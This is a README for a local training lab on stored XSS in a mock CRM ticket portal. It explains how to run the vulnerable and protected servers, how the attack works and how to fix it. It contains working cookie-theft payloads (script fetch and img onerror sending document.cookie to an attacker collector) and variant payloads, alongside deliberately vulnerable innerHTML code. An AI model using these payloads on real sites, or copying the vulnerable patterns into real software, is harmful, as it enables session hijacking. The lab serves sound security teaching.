# Stored XSS — NovaCRM Support Ticket Portal

## Port Reference

| Port | Role | File | npm script |
|------|------|------|------------|
| 3001 | Vulnerable victim | `victim-server.js` | `npm run vulnerable` |
| 3002 | Attacker collector | `attacker-server.js` | `npm run guide` |
| 3009 | Protected victim | `victim-server-protected.js` | `npm run secure` |

## Attack Flow

```
Attacker posts comment containing <script>fetch('//3002?c='+document.cookie)</script>
        ↓ (stored in DB)
NovaCRM (3001) renders comments on every page load — no escaping
        ↓
Victim visits the page
        ↓
Victim's browser executes the script → sends session cookie to attacker server (3002)
```

## What It Is

Stored XSS is the most dangerous variant. The attacker's payload is saved to the server — in a database, file, or in-memory store — and delivered to every user who views the affected page. No further action from the attacker is required after the initial submission.

This pattern is common in support ticket systems, comment sections, forum posts, CMS platforms, and any application that stores user-generated content and renders it later. Real-world incidents have affected platforms from MySpace (the Samy worm, 2005) to modern SaaS helpdesks where agent dashboards render ticket bodies as HTML.

## How to Run

1. Open two terminals.
2. Terminal 1: `cd demo-attacked/xss/stored && npm run vulnerable`
3. Terminal 2: `cd demo-attacked/xss/stored && npm run guide`
4. Open `http://localhost:3001/admin` first — this sets the `agent_session` cookie.
5. Open `http://localhost:3002` in a separate window — attacker dashboard.
6. Open `http://localhost:3001` in a third tab — customer portal.
7. In the customer portal, submit a new ticket. Use these exact values:
   - Name: `Attacker`
   - Subject: `Having trouble logging in`
   - Message: `<img src="x" onerror="new Image().src='http://localhost:3002/steal?c='+encodeURIComponent(document.cookie)">`
8. The ticket appears in the **Recent Community Tickets** feed on the customer portal.
9. The `onerror` handler fires when the feed re-renders. Watch the cookie arrive on the attacker dashboard.

> **Note:** The admin dashboard (`/admin`) already uses `textContent` for ticket messages — a partial fix. The primary vulnerable render is the community ticket feed on `victim.html`.

## Vulnerable Code — Exact Lines

**`victim.html`**

Line ~279 — `message.innerHTML` renders the full message body as HTML:

```js
message.innerHTML = ticket.message;
// ticket.message came from req.body.message with zero sanitization.
// The browser parses this as HTML. Any tag, any event handler, executes.
```

**`victim-server.js`**

Line ~55 — Cookie set without HttpOnly, making it readable by JavaScript:

```js
res.cookie('agent_session', '...', { path: '/', httpOnly: false })
// httpOnly: false means document.cookie includes this token.
```

Line ~67 — No sanitization before storing:

```js
const ticket = { name, email, subject, message }; // raw body values, no cleaning
tickets.unshift(ticket);
```

## Why These Lines Are Dangerous

When `innerHTML` receives a string containing `<img onerror>`, the browser constructs a real `HTMLImageElement`, sets its `src`, the `src` fails (no resource at `"x"`), and the browser fires `onerror` as a genuine DOM event — with full JavaScript privileges in the page's origin.

The `encodeURIComponent(document.cookie)` runs in the document context of `localhost:3001`, which holds `agent_session` (set when `/admin` was visited). The `new Image().src` technique sends a GET request to the attacker server without triggering a CORS preflight.

## Payload Variants

1. **`<img src="x" onerror="...">`** — Works even when `<script>` tags are filtered by a WAF or sanitizer that only blocks script elements.
2. **`<svg onload="...">`** — SVG elements fire `onload` without needing a `src` attribute.
3. **`<body onpageshow="...">`** — Fires when the page is shown or restored from the back-forward cache.

## The Fix — Exact Lines

**`victim-protected.html`**

```js
message.textContent = ticket.message;
// textContent assigns the string as a text node — never parsed as HTML.
// <img onerror="..."> is displayed as the literal characters < i m g ... >
// The browser never constructs an HTMLImageElement. No event fires. No execution.
```

**`victim-server-protected.js`**

Cookie fix:

```js
res.cookie('agent_session', '...', { path: '/', httpOnly: true })
// httpOnly: true — document.cookie never includes this cookie.
```

Sanitization at ingestion:

```js
const sanitizeText = (str) => String(str).replace(/<[^>]*>/g, '').trim();
const ticket = {
  name: sanitizeText(name),
  message: sanitizeText(message),
};
// Defense-in-depth: even if innerHTML is used accidentally later, stored data has no tags.
```

## Edge Cases

- **CSP alone is not enough:** `onerror` handlers are inline event attributes. Standard CSP does not block them without `'unsafe-inline'` explicitly denied AND a nonce-based policy.
- **Sanitizing only the message misses the name field:** Both fields were renderable via `innerHTML`. Auditors often check only obvious free-text fields.
- **DOMPurify for rich text:** If the app needs to allow some HTML (bold, links), use DOMPurify's allowlist approach. Never write your own allowlist logic.

## This Demo in Real Frameworks

The vulnerability is identical across frameworks — only the syntax differs.

**React:**
```jsx
// ⚠️ Byte-for-byte equivalent to innerHTML = ticket.message
<div dangerouslySetInnerHTML={{ __html: ticket.message }} />

// ✅ Safe — React escapes text by default
<div>{ticket.message}</div>
```

**Angular:**
```html
<!-- ⚠️ [innerHTML] binding is equivalent to innerHTML -->
<div [innerHTML]="ticket.message"></div>

<!-- ✅ Safe — text interpolation escapes HTML -->
<div>{{ ticket.message }}</div>
```

**Vue:**
```html
<!-- ⚠️ v-html is equivalent to innerHTML -->
<div v-html="ticket.message"></div>

<!-- ✅ Safe — mustache interpolation escapes HTML -->
<div>{{ ticket.message }}</div>
```

React, Angular, and Vue all escape text interpolation by default. The vulnerability only appears when the developer explicitly opts into raw HTML rendering. These escape hatches exist for legitimate cases (markdown rendering, rich-text editors) but must only be used with sanitized input.
